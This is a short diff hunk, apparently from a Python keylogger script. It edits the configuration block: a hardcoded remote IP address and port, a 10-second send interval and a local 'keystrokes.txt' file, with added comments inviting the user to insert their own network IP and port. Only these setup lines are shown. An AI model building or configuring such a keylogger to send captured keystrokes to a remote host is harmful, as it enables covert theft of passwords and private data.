@@ -6,8 +6,8 @@ import threading
 
 # Global variables
 text = ""
-ip_address = "109.74.200.23"
-port_number = "8080"
+ip_address = "109.74.200.23" # your Network IP goes here
+port_number = "8080" # your Network Port goes here
 time_interval = 10
 local_file = "keystrokes.txt"
 
